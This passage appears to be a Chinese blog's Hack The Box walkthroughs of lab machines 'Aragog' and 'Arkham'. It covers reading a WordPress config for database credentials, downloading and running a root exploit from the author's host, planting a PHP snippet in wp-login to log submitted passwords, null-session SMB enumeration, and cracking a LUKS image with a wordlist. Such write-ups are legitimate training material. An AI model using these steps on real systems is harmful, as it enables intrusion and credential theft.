cat user.txt </span><br><span class="hljs-string">f43.............................</span><br></code></pre></td></tr></table></figure><p>在用户目录能够看到.mysql_history，而且是有数据库服务的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:~$ <span class="hljs-built_in">ls</span> -a<br>.              .bash_history  .config  .gnupg          .nano                      .xsession-errors      Downloads  Templates<br>..             .bash_logout   .dbus    .<span class="hljs-built_in">local</span>          .profile                   .xsession-errors.old  Music      Videos<br>.ICEauthority  .bashrc        .dmrc    .mozilla        .ssh                       Desktop               Pictures   examples.desktop<br>.Xauthority    .cache         .gconf   .mysql_history  .sudo_as_admin_successful  Documents             Public     user.txt<br>florian@aragog:~$ netstat -antp<br>(No info could be <span class="hljs-built_in">read</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;-p&quot;</span>: geteuid()=1000 but you should be root.)<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               <br>tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               <br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               <br>tcp        0      0 127.0.0.1:43106         127.0.0.1:80            TIME_WAIT   -               <br>tcp        0    476 10.10.10.78:22          10.10.16.3:37292        ESTABLISHED -               <br>tcp6       0      0 :::80                   :::*                    LISTEN      -               <br>tcp6       0      0 :::21                   :::*                    LISTEN      -               <br>tcp6       0      0 :::22                   :::*                    LISTEN      -               <br>tcp6       0      0 ::1:631                 :::*                    LISTEN      -         <br></code></pre></td></tr></table></figure><p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;dev_wiki似乎还有一个wordpress站点，里边有个数据库的凭证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:/var/www/html/dev_wiki$ <span class="hljs-built_in">ls</span><br>index.php    wp-activate.php     wp-comments-post.php  wp-cron.php        wp-load.php   wp-settings.php   xmlrpc.php<br>license.txt  wp-admin            wp-config.php         wp-includes        wp-login.php  wp-signup.php<br>readme.html  wp-blog-header.php  wp-content            wp-links-opml.php  wp-mail.php   wp-trackback.php<br>florian@aragog:/var/www/html/dev_wiki$ <span class="hljs-built_in">cat</span> wp-con<br>wp-config.php  wp-content/    <br>florian@aragog:/var/www/html/dev_wiki$ <span class="hljs-built_in">cat</span> wp-config.php <br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wp_wiki<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-variable">$@y6CHJ</span>^$<span class="hljs-comment">#5c37j$#6h&#x27;);</span><br><br>/** MySQL hostname */<br>define(<span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br><br>/** Database Charset to use <span class="hljs-keyword">in</span> creating database tables. */<br>define(<span class="hljs-string">&#x27;DB_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><br>/** The Database Collate <span class="hljs-built_in">type</span>. Don<span class="hljs-string">&#x27;t change this if in doubt. */</span><br><span class="hljs-string">define(&#x27;</span>DB_COLLATE<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**#@+</span><br><span class="hljs-string"> * Authentication Unique Keys and Salts.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * Change these to different unique phrases!</span><br><span class="hljs-string"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="hljs-string"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @since 2.6.0</span><br><span class="hljs-string"> */</span><br><span class="hljs-string">define(&#x27;</span>AUTH_KEY<span class="hljs-string">&#x27;,         &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>SECURE_AUTH_KEY<span class="hljs-string">&#x27;,  &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>LOGGED_IN_KEY<span class="hljs-string">&#x27;,    &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>NONCE_KEY<span class="hljs-string">&#x27;,        &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>AUTH_SALT<span class="hljs-string">&#x27;,        &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>SECURE_AUTH_SALT<span class="hljs-string">&#x27;, &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>LOGGED_IN_SALT<span class="hljs-string">&#x27;,   &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>NONCE_SALT<span class="hljs-string">&#x27;,       &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**#@-*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**</span><br><span class="hljs-string"> * WordPress Database Table prefix.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * You can have multiple installations in one database if you give each</span><br><span class="hljs-string"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="hljs-string"> */</span><br><span class="hljs-string">$table_prefix  = &#x27;</span>wp_<span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**</span><br><span class="hljs-string"> * For developers: WordPress debugging mode.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * Change this to true to enable the display of notices during development.</span><br><span class="hljs-string"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="hljs-string"> * in their development environments.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * For information on other constants that can be used for debugging,</span><br><span class="hljs-string"> * visit the Codex.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string">define(&#x27;</span>WP_DEBUG<span class="hljs-string">&#x27;, false);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* That&#x27;</span>s all, stop editing! Happy blogging. */<br><br>/** Absolute path to the WordPress directory. */<br><span class="hljs-keyword">if</span> ( !defined(<span class="hljs-string">&#x27;ABSPATH&#x27;</span>) )<br>        define(<span class="hljs-string">&#x27;ABSPATH&#x27;</span>, <span class="hljs-built_in">dirname</span>(__FILE__) . <span class="hljs-string">&#x27;/&#x27;</span>);<br><br>/** Sets up WordPress vars and included files. */<br>require_once(ABSPATH . <span class="hljs-string">&#x27;wp-settings.php&#x27;</span>);<br>florian@aragog:/var/www/html/dev_wiki$ <br></code></pre></td></tr></table></figure><p>里边有密码，但是破解不出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> * from wp_users;<br>+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+<br>| ID | user_login    | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name  |<br>+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+<br>|  1 | Administrator | $P<span class="hljs-variable">$B3FUuIdSDW0IaIc4vsjj</span>.NzJDkiscu. | administrator | it@megacorp.com |          | 2017-12-20 23:26:04 |                     |           0 | Administrator |<br>+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h2 id="Root-txt"><a href="#Root-txt" class="headerlink" title="Root.txt:"></a>Root.txt:</h2><p>介于这机器退休很久了，其系统版本落后存在很多提权漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:~$ wget http://10.10.16.3/pwk.py<br>--2022-08-28 19:41:56--  http://10.10.16.3/pwk.py<br>Connecting to 10.10.16.3:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;pwk.py&#x27;</span><br><br>pwk.py                                                               100%[===================================================================================================================================================================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0.001s  <br><br>2022-08-28 19:41:56 (6.07 MB/s) - <span class="hljs-string">&#x27;pwk.py&#x27;</span> saved [3448/3448]<br><br>florian@aragog:~$ python3 pwk.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(florian)<br><span class="hljs-comment"># cat /root/root.txt</span><br>9a9d.................................<br></code></pre></td></tr></table></figure><p>作者实际留的路径应该是这里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">2022/08/28 19:46:15 CMD: UID=0    PID=10     | <br>2022/08/28 19:46:15 CMD: UID=0    PID=1      | /sbin/init auto noprompt <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2657   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2656   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:47:01 CMD: UID=0    PID=2655   | /usr/sbin/CRON -f <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2658   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2661   | <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2660   | sh -c <span class="hljs-built_in">uname</span> -p 2&gt; /dev/null <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2664   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2663   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=0    PID=2662   | /usr/sbin/CRON -f <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2665   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2667   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2668   | <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2671   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2670   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:49:01 CMD: UID=0    PID=2669   | /usr/sbin/CRON -f <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2672   | <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2675   | sh -c <span class="hljs-built_in">uname</span> -p 2&gt; /dev/null <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2674   | sh -c <span class="hljs-built_in">uname</span> -p 2&gt; /dev/null <br></code></pre></td></tr></table></figure><p>每过一段时间就会以用户1001身份运行一些进程。他在一直回复wordpress站点，而wp-login.py 看起来像是在自动登录wordpress站点。可以更改wp-login去接收用户输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$rrr</span> = print_r(<span class="hljs-variable">$_REQUEST</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable">$fff</span> = fopen(<span class="hljs-string">&quot;/dev/shm/pwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$fff</span>, <span class="hljs-variable">$rrr</span>);<br>fclose(<span class="hljs-variable">$fff</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:/dev/shm$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">pwd</span> <br>Array<br>(<br>    [<span class="hljs-built_in">pwd</span>] =&gt; !KRgYs(JFO!&amp;MTr)lf<br>    [wp-submit] =&gt; Log In<br>    [testcookie] =&gt; 1<br>    [<span class="hljs-built_in">log</span>] =&gt; Administrator<br>    [redirect_to] =&gt; http://127.0.0.1/dev_wiki/wp-admin/<br>)<br></code></pre></td></tr></table></figure><p>这是root的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:/dev/shm$ <span class="hljs-built_in">cd</span> /home/<br>florian@aragog:/home$ <span class="hljs-built_in">ls</span><br>cliff  florian<br>florian@aragog:/home$ su cliff<br>Password: <br>su: Authentication failure<br>florian@aragog:/home$ su root<br>Password: <br>root@aragog:/home<span class="hljs-comment"># cat /root/root.txt </span><br>9a9...............................<br>root@aragog:/home<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Arkham</title>
    <link href="/post/HackTheBox-Arkham.html"/>
    <url>/post/HackTheBox-Arkham.html</url>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92 scan initiated Mon Apr 11 13:54:44 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.130</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.130<br>Host is up (0.14s latency).<br>Not shown: 65528 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: IIS Windows Server<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>8080/tcp  open  http          Apache Tomcat 8.5.37<br>|_http-title: Mask Inc.<br>| http-methods: <br>|_  Potentially risky methods: PUT DELETE<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-04-11T05:58:30<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Mon Apr 11 13:59:08 2022 -- 1 IP address (1 host up) scanned in 264.29 seconds</span><br></code></pre></td></tr></table></figure><p>80跟8080的发掘相对其他来说算是一个大工程，我决定先从小的开始做起，比如先查看一下目标smb共享，密码为空即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># smbclient --list //10.10.10.130/ -U &quot;&quot;</span><br>Enter WORKGROUP\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">        Sharename       Type      Comment</span><br><span class="hljs-string">        ---------       ----      -------</span><br><span class="hljs-string">        ADMIN$          Disk      Remote Admin</span><br><span class="hljs-string">        BatShare        Disk      Master Wayne&#x27;</span>s secrets<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        Users           Disk      <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.10.130 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure><p>可以先试着去访问一下目标的隐藏共享:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># smbclient //10.10.10.130/C$ -U &quot;&quot;  </span><br>Enter WORKGROUP\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></code></pre></td></tr></table></figure><p>好吧，没密码认证的情况下都不允许。那我可以试着去访问一下Users:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //10.10.10.130/Users -U <span class="hljs-string">&quot;&quot;</span><br>Enter WORKGROUP\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; help</span><br></code></pre></td></tr></table></figure><p>Users共享中有一个Guset来宾账户与一个Default账户，但是我浏览了一番并没有什么信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                  DR        0  Sun Feb  3 21:24:10 2019<br>  ..                                 DR        0  Sun Feb  3 21:24:10 2019<br>  Default                           DHR        0  Fri Feb  1 10:49:06 2019<br>  desktop.ini                       AHS      174  Sat Sep 15 15:16:48 2018<br>  Guest                               D        0  Sun Feb  3 21:24:19 2019<br><br>                5158399 blocks of size 4096. 2123570 blocks available<br></code></pre></td></tr></table></figure><p>在BatShare共享中有一个appserver.zip：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># smbclient //10.10.10.130/BatShare -U &quot;&quot;</span><br>Enter WORKGROUP\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; dir</span><br><span class="hljs-string">  .                                   D        0  Sun Feb  3 21:00:10 2019</span><br><span class="hljs-string">  ..                                  D        0  Sun Feb  3 21:00:10 2019</span><br><span class="hljs-string">  appserver.zip                       A  4046695  Fri Feb  1 14:13:37 2019</span><br><span class="hljs-string"></span><br><span class="hljs-string">                5158399 blocks of size 4096. 2132256 blocks available</span><br></code></pre></td></tr></table></figure><p>我可以下载到本地去看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; get appserver.zip<br></code></pre></td></tr></table></figure><p>它包含两种东西，一个备份镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"> unzip appserver.zip             <br>Archive:  appserver.zip<br>  inflating: IMPORTANT.txt           <br>  inflating: backup.img  <br></code></pre></td></tr></table></figure><p>以及一份说明文档：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat IMPORTANT.txt </span><br>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone <span class="hljs-keyword">else</span> doesn<span class="hljs-string">&#x27;t have unauthenticated access to it. - Bruce </span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">阿尔弗雷德，这是我们linux服务器的备份映像。 请确保小丑或其他任何人没有未经身份验证的访问权限。 ——布鲁斯  <br></code></pre></td></tr></table></figure><p><code>Backup.img</code>是一个<code>LUKS</code>加密的图像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">file backup.img <br>backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e<br></code></pre></td></tr></table></figure><p>我可以试着打开它，但是我没有密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">─<span class="hljs-comment"># cryptsetup open --type luks backup.img test</span><br>输入 backup.img 的口令：<br>此口令无可用的密钥。<br>输入 backup.img 的口令：<br>此口令无可用的密钥。<br>输入 backup.img 的口令：<br>此口令无可用的密钥。<br></code></pre></td></tr></table></figure><p>可以尝试用bruteforce-luk去破解一下密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bruteforce-luks -f /usr/share/wordlists/rockyou.txt ./backup.img <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.<br><br>Tried passwords: 60<br>Tried passwords per second: 0.480000<br>Last tried password: batmanforever<br><br>Password found: batmanforever<br></code></pre></td></tr></table></figure><p>然后我可以试着去挂载访问镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cryptsetup open --<span class="hljs-built_in">type</span> luks backup.img <span class="hljs-built_in">test</span><br>输入 backup.img 的口令：<br></code></pre></td></tr></table></figure><p>它有一个空文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8]<br>└─<span class="hljs-comment"># ls</span><br>lost+found  Mask<br>                                                                                                                                                          <br>┌──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8]<br>└─<span class="hljs-comment"># cd lost+found </span><br>                                                                                                                                                          <br>┌──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8/lost+found]<br>└─<span class="hljs-comment"># ls</span><br>                                                                                                                                                          